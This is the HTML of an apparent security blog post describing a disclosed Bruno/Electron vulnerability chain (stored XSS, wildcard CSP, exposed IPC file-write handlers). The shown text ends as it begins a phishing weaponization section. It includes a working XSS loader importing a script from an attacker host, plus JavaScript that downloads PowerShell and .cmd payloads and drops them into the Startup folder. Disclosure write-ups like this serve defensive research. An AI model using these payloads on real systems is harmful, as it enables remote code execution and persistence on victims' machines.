@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Attacking Bruno : Peeling the Brunion | Ottersec Blog</title>
+  <link rel = 'canonical' href = 'https://sneakyottersec.github.io/posts/bruno/'>
+  <meta name="description" content="Red Teamer / Pentester. Focus on Active Directory / Azure / Windows logical bug">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="https://sneakyottersec.github.io/posts/bruno/">
+  <meta property="og:site_name" content="Ottersec Blog">
+  <meta property="og:title" content="Attacking Bruno : Peeling the Brunion">
+  <meta property="og:description" content="Attacking Bruno : a small Electron for a nuclear reaction 0. Introduction Bruno is the open-source alternative to Postman. Both tools are used for API testing and development and both aim at making API workflows less painful, which makes them a staple of any developer’s toolbox. Bruno being an Electron application, it inherits the whole web attack surface plus a desktop one — and that combination is exactly what we are going to abuse here.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-10T00:00:00+00:00">
+    <meta property="article:tag" content="Electron">
+    <meta property="article:tag" content="XSS">
+    <meta property="article:tag" content="CSP">
+    <meta property="article:tag" content="CVE">
+    <meta property="article:tag" content="Bruno">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Attacking Bruno : Peeling the Brunion">
+  <meta name="twitter:description" content="Attacking Bruno : a small Electron for a nuclear reaction 0. Introduction Bruno is the open-source alternative to Postman. Both tools are used for API testing and development and both aim at making API workflows less painful, which makes them a staple of any developer’s toolbox. Bruno being an Electron application, it inherits the whole web attack surface plus a desktop one — and that combination is exactly what we are going to abuse here.">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://sneakyottersec.github.io/css/styles.4c2b9aa1d874d6766f554b2d404e8fd62ab4761f51ee9b3f358d12e81e7fa43a1b4378db995bc1926bbe5ed98c060be5e7bd4f2470504cf94f22b4b3a74e62b6.css" integrity="sha512-TCuaodh01nZvVUstQE6P1iq0dh9R7ps/NY0S6B5/pDobQ3jbmVvBkmu&#43;XtmMBgvl571PJHBQTPlPIrSzp05itg==">
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://sneakyottersec.github.io/images/favicon.ico" />
+
+  
+  
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-B7WYBWVRDC"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-B7WYBWVRDC');
+        }
+      </script>
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://sneakyottersec.github.io/posts/azuretoken/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&text=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&is_video=false&description=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion&body=Check out this article: https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&name=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion&description=%3ch1%20id%3d%22attacking-bruno--a-small-electron-for-a-nuclear-reaction%22%3eAttacking%20Bruno%20%3a%20a%20small%20Electron%20for%20a%20nuclear%20reaction%3c%2fh1%3e%0a%3ch2%20id%3d%220-introduction%22%3e0.%20Introduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.usebruno.com%2f%22%3eBruno%3c%2fa%3e%20is%20the%20open-source%20alternative%20to%20Postman.%20Both%20tools%20are%20used%20for%20API%20testing%20and%20development%20and%20both%20aim%20at%20making%20API%20workflows%20less%20painful%2c%20which%20makes%20them%20a%20staple%20of%20any%20developer%26rsquo%3bs%20toolbox.%20Bruno%20being%20an%20Electron%20application%2c%20it%20inherits%20the%20whole%20web%20attack%20surface%20%3cem%3eplus%3c%2fem%3e%20a%20desktop%20one%20%e2%80%94%20and%20that%20combination%20is%20exactly%20what%20we%20are%20going%20to%20abuse%20here.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&t=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-introduction">0. Introduction</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#11-the-attack-surface">1.1 The attack surface</a></li>
+    <li><a href="#12-inner-working--processes-and-ipc">1.2 Inner working : processes and IPC</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-unpacking-appasar">2.1 Unpacking <code>app.asar</code></a></li>
+    <li><a href="#22-indexjs--the-security-configuration">2.2 <code>index.js</code> : the security configuration</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#31-finding-the-entry-point">3.1 Finding the entry point</a></li>
+    <li><a href="#32-the-50-characters-problem">3.2 The 50 characters problem</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#41-is-this-a-real-csp-">4.1 Is this a real CSP ?</a></li>
+    <li><a href="#42-beating-the-50-char-limit">4.2 Beating the 50 char limit</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#51-a-quick-reminder-on-context-isolation-and-ipc">5.1 A quick reminder on Context Isolation and IPC</a></li>
+    <li><a href="#52-searching-for-exposed-functions">5.2 Searching for exposed functions</a></li>
+    <li><a href="#53-renderernew-file--arbitrary-file-creation">5.3 <code>renderer:new-file</code> — arbitrary file creation</a></li>
+    <li><a href="#54-renderersave-file--arbitrary-content">5.4 <code>renderer:save-file</code> — arbitrary content</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#61-the-xss-loader">6.1 The XSS loader</a></li>
+    <li><a href="#62-the-ipc-payload">6.2 The IPC payload</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#71-crafting-a-malicious-environment">7.1 Crafting a malicious environment</a></li>
+    <li><a href="#72-the-full-chain-in-action">7.2 The full chain in action</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Attacking Bruno : Peeling the Brunion
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2025-12-10 00:00:00 &#43;0000 UTC" itemprop="datePublished">2025-12-10</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          10 minute read
+        </div>
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/electron" rel="tag">Electron</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/xss" rel="tag">XSS</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/csp" rel="tag">CSP</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/cve" rel="tag">CVE</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/bruno" rel="tag">Bruno</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+    
+    <div class="content" itemprop="articleBody">
+      <h1 id="attacking-bruno--a-small-electron-for-a-nuclear-reaction">Attacking Bruno : a small Electron for a nuclear reaction</h1>
+<h2 id="0-introduction">0. Introduction</h2>
+<p><a href="https://www.usebruno.com/">Bruno</a> is the open-source alternative to Postman. Both tools are used for API testing and development and both aim at making API workflows less painful, which makes them a staple of any developer&rsquo;s toolbox. Bruno being an Electron application, it inherits the whole web attack surface <em>plus</em> a desktop one — and that combination is exactly what we are going to abuse here.</p>
+<p>Before going further, a word of caution : nothing in this post is a brand new exploitation primitive. It is a fairly classic Electron killchain — an XSS, a loose CSP and a couple of dangerous functions exposed over IPC. What is (hopefully) interesting is how those three mundane weaknesses, none of them dramatic on its own, are chained together into a remote code execution against a developer tool. The chain was disclosed to the Bruno team and is tracked as <a href="https://github.com/usebruno/bruno/security/advisories/GHSA-fqxc-cxph-9vq8">CVE-2025-30210</a> (CVSS 8.7), fixed in Bruno 1.39.1.</p>
+<p>In this blog post we will :</p>
+<ul>
+<li>Cover the fundamentals of the <strong>Electron</strong> framework and its attack surface</li>
+<li>Walk through <strong>three weaknesses</strong> discovered in Bruno (a Stored XSS, a loose CSP and a dangerous IPC function exposed through <code>contextBridge</code>)</li>
+<li>Chain them into a full <strong>killchain</strong> leading to an arbitrary file write, and then weaponize it into code execution</li>
+</ul>
+<p>No more talking, let&rsquo;s jump into the technical stuff.</p>
+<hr>
+<h1 id="1-electron-101">1. Electron 101</h1>
+<p>The Electron framework is the go-to solution when one wants to port a website into a lightweight desktop application. Under the hood, it is essentially three things glued together :</p>
+<p><img src="electron_what_is.png" alt="Electron is Node.js + Chromium + your web app"></p>
+<ul>
+<li><strong>Node.js</strong> for everything filesystem / OS related ;</li>
+<li><strong>Chromium</strong> to render the UI ;</li>
+<li>and <strong>your web application</strong> (HTML/CSS/JS) sitting on top.</li>
+</ul>
+<p>The immediate consequence is that an Electron application can be plagued by every vulnerability you would find on the web (XSS being the obvious one), <strong>on top of</strong> the ones you would expect from a desktop application (arbitrary file write, code execution, &hellip;).</p>
+<h2 id="11-the-attack-surface">1.1 The attack surface</h2>
+<p>When auditing an Electron application, the attack surface can be broken down into four layers :</p>
+<p><img src="electron_attack_surface.png" alt="Electron application attack surface"></p>
+<p>In this article we will focus almost exclusively on <strong>layer 1 — the application custom code</strong> : the insecure user input (our XSS), the security flags and the preload script. The framework and third-party binaries (Chromium n-days and friends) are way out of scope — if you are burning a Chromium 0-day, you probably have better targets than an API client.</p>
+<h2 id="12-inner-working--processes-and-ipc">1.2 Inner working : processes and IPC</h2>
+<p>Two concepts are mandatory to understand the rest of this post : the <strong>process model</strong> and the <strong>IPC</strong>.</p>
+<p><img src="electron_inner_working.png" alt="Electron inner working : renderer process, main process and IPC"></p>
+<ul>
+<li>The <strong>renderer process</strong> is where the web content lives (our HTML/JS). This is where an XSS gets us a foothold. By design it should be isolated and should <em>not</em> be able to touch Node.js directly.</li>
+<li>The <strong>main process</strong> is the privileged one. It has full access to Node.js, the OS and any &ldquo;dangerous&rdquo; function the developer decides to expose.</li>
+<li>The two can only talk to each other through the <strong>IPC</strong> (Inter-Process Communication). The renderer sends/receives messages, the main process handles them.</li>
+</ul>
+<p>The whole security of an Electron application boils down to one question : <strong>what can the renderer make the main process do through that IPC channel ?</strong> Keep that in mind, it is the crux of the whole killchain.</p>
+<blockquote>
+<p>For a deeper dive into Electron pentest methodology, the <a href="https://github.com/doyensec/electronegativity">Electronegativity</a> tool and the Doyensec research on the subject are an excellent starting point.</p>
+</blockquote>
+<hr>
+<h1 id="2-analyzing-bruno">2. Analyzing Bruno</h1>
+<h2 id="21-unpacking-appasar">2.1 Unpacking <code>app.asar</code></h2>
+<p>Electron applications ship their source code in an <code>app.asar</code> archive (basically a tar-like blob) sitting in the <code>resources/</code> folder :</p>
+<p><img src="electron_app_files.png" alt="Electron application files layout"></p>
+<p>Unpacking it is a one-liner with the <code>asar</code> utility :</p>
+<pre tabindex="0"><code>npx asar extract app.asar bruno_demo
+ls -l bruno_demo
+</code></pre><p><img src="asar_extract.png" alt="Extracting app.asar with the asar utility"></p>
+<p>And just like that we get the full unminified-ish source : <code>package.json</code>, <code>src/</code>, <code>node_modules/</code>, the whole thing. From an attacker&rsquo;s point of view, an Electron app is basically open source whether the vendor likes it or not.</p>
+<h2 id="22-indexjs--the-security-configuration">2.2 <code>index.js</code> : the security configuration</h2>
+<p>The first file worth reading is the one that creates the main <code>BrowserWindow</code>, because it holds all the security-relevant flags (<code>sandbox</code>, <code>nodeIntegration</code>, <code>contextIsolation</code>, the preload script, &hellip;) :</p>
+<p><img src="webpreferences.png" alt="webPreferences in Bruno&rsquo;s index.js"></p>
+<p>At first glance this looks <em>bad</em> — <code>nodeIntegration: true</code> would normally mean &ldquo;free RCE from any XSS&rdquo;. But there is a subtlety : <code>contextIsolation</code> is <strong>also</strong> set to <code>true</code>, and the two settings conflict. When context isolation is enabled, <code>nodeIntegration</code> is effectively ignored and treated as <code>false</code>. So no, we will not be calling <code>require('child_process')</code> straight from our XSS.</p>
+<p>Here is the decision matrix depending on the combination of flags :</p>
+<p><img src="ni_ci_matrix.png" alt="Node Integration / Context Isolation decision matrix"></p>
+<p>Bruno sits in the <strong>last row</strong> : Node Integration and Context Isolation both enabled. Direct RCE and preload-based exploitation are off the table, which leaves us with one realistic path — <strong>abusing the functions exposed through <code>contextBridge</code></strong>. We will come back to it in part 4.</p>
+<hr>
+<h1 id="3-finding-our-xss">3. Finding our XSS</h1>
+<p>The free version of Bruno does not provide a lot of input vectors, so identifying an entry point is mostly a matter of iterating over the few data sources available and looking for one that is rendered without sanitization.</p>
+<h2 id="31-finding-the-entry-point">3.1 Finding the entry point</h2>
+<p>It turns out that the <strong>name of a global environment</strong> is not sanitized before being displayed, which makes it prone to a Stored XSS injection. A payload as simple as :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">onerror</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">alert(1)</span> /&gt;
+</span></span></code></pre></div><p>dropped into the environment name is enough to pop the classic <code>alert(1)</code> :</p>
+<p><img src="xss_env_name.png" alt="Stored XSS triggered through the global environment name"></p>
+<p>No filtering whatsoever is applied before the user-controlled data is rendered. So far so good — but there is a catch.</p>
+<h2 id="32-the-50-characters-problem">3.2 The 50 characters problem</h2>
+<p>The environment name field caps our input at <strong>50 characters</strong>. That is more than enough for an <code>alert(1)</code> PoC, but nowhere near enough to stage a real payload (download a file, talk to the IPC, &hellip;). This limitation is exactly what we will circumvent thanks to the next weakness.</p>
+<hr>
+<h1 id="4-you-shall-pass---abusing-a-loose-csp">4. You shall pass ! — abusing a loose CSP</h1>
+<p>As seen earlier, <code>index.js</code> is also where the <strong>Content Security Policy</strong> is defined. A well-configured CSP would, in theory, prevent us from loading external scripts and largely neuter the XSS. Let&rsquo;s see what Bruno implemented.</p>
+<h2 id="41-is-this-a-real-csp-">4.1 Is this a real CSP ?</h2>
+<p>Bruno <em>did</em> implement a CSP. Unfortunately, it was loose to the point of being decorative :</p>
+<p><img src="csp.png" alt="Bruno&rsquo;s Content Security Policy with a wildcard script-src"></p>
+<p>Look at the <code>script-src</code> directive :</p>
+<pre tabindex="0"><code>&#34;script-src * &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&#34;,
+</code></pre><p>The wildcard <code>*</code> combined with <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> means our script can be <strong>hosted anywhere</strong> and will be happily loaded and executed by the application. A CSP with a wildcard <code>script-src</code> is a wall with a very nice door cut into it.</p>
+<h2 id="42-beating-the-50-char-limit">4.2 Beating the 50 char limit</h2>
+<p>This is the key that unlocks the whole chain. Instead of trying to cram a payload into 50 characters, we simply use those precious characters to <strong>load a remote script</strong> from a server we control :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">img</span>/<span style="color:#50fa7b">src</span>/<span style="color:#50fa7b">onerror</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">import(&#39;http://&lt;IP_ADDR</span>&gt;/a.js&#39;)&gt;
+</span></span></code></pre></div><p>That is well under the limit, and <code>a.js</code> hosted on our box can be as large as we want. The 50-character cap is now irrelevant : our XSS is a tiny loader, and the real logic lives on the attacker&rsquo;s server.</p>
+<hr>
+<h1 id="5-code-execution-through-contextbridge">5. Code execution through <code>contextBridge</code></h1>
+<p>At this point we can :</p>
+<ul>
+<li>Inject JavaScript into the renderer (the Stored XSS)</li>
+<li>Run an arbitrarily large payload (the loose CSP loader)</li>
+</ul>
+<p>But we are still stuck inside the renderer. To turn this into something dangerous we need the main process to do our bidding, and as established in part 2 the only realistic route is a <strong>dangerous function exposed through <code>contextBridge</code></strong>.</p>
+<h2 id="51-a-quick-reminder-on-context-isolation-and-ipc">5.1 A quick reminder on Context Isolation and IPC</h2>
+<p>Context isolation separates the JavaScript context of the renderer from the main process, which is supposed to prevent the renderer from reaching Node.js APIs directly. But isolation does not magically make things safe : the developer still has to <em>expose</em> the functions the renderer legitimately needs, and <strong>whatever is exposed becomes attack surface</strong>.</p>
+<p>Functions are exposed with <code>contextBridge.exposeInMainWorld</code>, and communication then happens over the IPC :</p>
+<ul>
+<li><code>send</code> / <code>on</code> and <code>invoke</code> from the <strong>renderer</strong> side</li>
+<li><code>handle</code> from the <strong>main</strong> side</li>
+</ul>
+<p>Bruno&rsquo;s <code>preload.js</code> exposes the whole <code>ipcRenderer</code> to the renderer world :</p>
+<p><img src="preload_contextbridge.png" alt="Bruno&rsquo;s preload.js exposing ipcRenderer through contextBridge"></p>
+<p>Exposing a generic <code>invoke</code> like this is a big deal : it means the renderer can call <strong>any</strong> IPC channel the main process registers with <code>ipcMain.handle</code>. So the real question becomes : what does the main process handle ?</p>
+<h2 id="52-searching-for-exposed-functions">5.2 Searching for exposed functions</h2>
+<p>Grepping for <code>ipcMain.handle</code> in the source gives a long list of handlers — Bruno wires most of its internal functionality through the IPC :</p>
+<p><img src="exposed_functions.png" alt="A subset of Bruno&rsquo;s ipcMain.handle handlers"></p>
+<p>Two of them immediately stand out : <code>renderer:new-file</code> and <code>renderer:save-file</code>.</p>
+<h2 id="53-renderernew-file--arbitrary-file-creation">5.3 <code>renderer:new-file</code> — arbitrary file creation</h2>
+<p>The <code>new-file</code> handler creates a file at an attacker-controlled path. The only check is whether the file already exists — no path filtering, no allow-list, nothing :</p>
+<p><img src="ipc_new_file.png" alt="renderer:new-file handler"></p>
+<p>We can therefore create an empty file anywhere the user has write access.</p>
+<h2 id="54-renderersave-file--arbitrary-content">5.4 <code>renderer:save-file</code> — arbitrary content</h2>
+<p>An empty file is not very useful, so let&rsquo;s fill it. <code>renderer:save-file</code> does exactly that, and just like its sibling it enforces <strong>no path filtering</strong> :</p>
+<p><img src="ipc_save_file.png" alt="renderer:save-file handler"></p>
+<p>Both ultimately call the same helper, an unguarded <code>fs.writeFileSync</code> :</p>
+<p><img src="writefile.png" alt="The writeFile helper : fs.writeFileSync with utf8 encoding"></p>
+<p>The only real restriction is the <strong>UTF-8 encoding</strong>, which prevents us from writing raw binary content. That is a minor annoyance — plenty of interesting payloads (<code>.ps1</code>, <code>.cmd</code>, <code>.bat</code>, &hellip;) are plain text.</p>
+<hr>
+<h1 id="6-full-killchain">6. Full killchain</h1>
+<p>Let&rsquo;s recap what we have stitched together :</p>
+<ol>
+<li><strong>Stored XSS</strong> on the global environment name <em>(<a href="https://github.com/usebruno/bruno/security/advisories/GHSA-fqxc-cxph-9vq8">CVE-2025-30210</a>)</em></li>
+<li><strong>Loose CSP</strong> with a wildcard <code>script-src</code>, used to bypass the 50-character limit</li>
+<li><strong>Arbitrary file write</strong> through the <code>renderer:new-file</code> + <code>renderer:save-file</code> functions exposed via <code>contextBridge</code> <em>(part of the same advisory)</em></li>
+</ol>
+<h2 id="61-the-xss-loader">6.1 The XSS loader</h2>
+<p>The XSS payload itself just bootstraps the real one from our server :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">img</span>/<span style="color:#50fa7b">src</span>/<span style="color:#50fa7b">onerror</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">import(&#39;http://&lt;IP_ADDR</span>&gt;/a.js&#39;)&gt;
+</span></span></code></pre></div><h2 id="62-the-ipc-payload">6.2 The IPC payload</h2>
+<p><code>a.js</code>, hosted on our VPS, is fetched and executed by Bruno. It downloads a malicious PowerShell script and a <code>.cmd</code>, then uses the IPC primitives to write them to disk — including a <code>.cmd</code> dropped straight into the user&rsquo;s <strong>Startup</strong> folder for persistence :</p>
+<p><img src="weaponized_payload.png" alt="Weaponized payload : downloading and writing files through the IPC"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> currentLocation <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">window</span>.location.href;
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Leak the current path with the username
+</span></span></span><span style="display:flex;"><span>console.log(currentLocation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Download the RCE.ps1 file
+</span></span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> downloader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
+</span></span><span style="display:flex;"><span>downloader.open(<span style="color:#f1fa8c">&#34;GET&#34;</span>, <span style="color:#f1fa8c">&#34;http://&lt;IP_ADDR&gt;/RCE.ps1&#34;</span>, <span style="color:#ff79c6">false</span>);
+</span></span><span style="display:flex;"><span>downloader.send();
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> maliciousPS1 <span style="color:#ff79c6">=</span> downloader.responseText;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ipcRenderer.invoke(<span style="color:#f1fa8c">&#34;renderer:new-file&#34;</span>,  <span style="color:#f1fa8c">&#34;C:/Users/pentest/Documents/WindowsPowerShell/RCE.ps1&#34;</span>);
+</span></span><span style="display:flex;"><span>ipcRenderer.invoke(<span style="color:#f1fa8c">&#34;renderer:save-file&#34;</span>, <span style="color:#f1fa8c">&#34;C:/Users/pentest/Documents/WindowsPowerShell/RCE.ps1&#34;</span>, maliciousPS1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Download the cmd file to be put in the startup folder
+</span></span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> downloader2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
+</span></span><span style="display:flex;"><span>downloader2.open(<span style="color:#f1fa8c">&#34;GET&#34;</span>, <span style="color:#f1fa8c">&#34;http://&lt;IP_ADDR&gt;/startup.cmd&#34;</span>, <span style="color:#ff79c6">false</span>);
+</span></span><span style="display:flex;"><span>downloader2.send();
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> maliciousCMD <span style="color:#ff79c6">=</span> downloader2.responseText;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ipcRenderer.invoke(<span style="color:#f1fa8c">&#34;renderer:new-file&#34;</span>,  <span style="color:#f1fa8c">&#34;C:/Users/pentest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.cmd&#34;</span>);
+</span></span><span style="display:flex;"><span>ipcRenderer.invoke(<span style="color:#f1fa8c">&#34;renderer:save-file&#34;</span>, <span style="color:#f1fa8c">&#34;C:/Users/pentest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.cmd&#34;</span>, maliciousCMD);
+</span></span></code></pre></div><p>Dropping a <code>.cmd</code> in <code>...\Start Menu\Programs\Startup\</code> means our payload executes on the next logon — arbitrary file write turned into code execution and persistence in one move.</p>
+<blockquote>
+<p><strong>Note</strong> : OPSEC is not the purpose of this blog post. The Startup folder is about as loud as persistence gets — plenty of stealthier options exist. Here it is only used to keep the killchain easy to follow.</p>
+</blockquote>
+<hr>
+<h1 id="7-bonus--weaponizing-the-killchain">7. Bonus : weaponizing the killchain</h1>
+<p>An <code>alert(1)</code> in your own client is one thing ; landing the chain on someone else&rsquo;s machine is another. The nice property of this XSS is that it lives in an <strong>environment</strong>, and environments are <em>meant to be shared</em> between teammates as Postman/Bruno collections. That makes it a perfect phishing vehicle.</p>
+<h2 id="71-crafting-a-malicious-environment">7.1 Crafting a malicious environment</h2>
+<p>We export a Postman environment whose <strong>name</strong> is our XSS loader :</p>
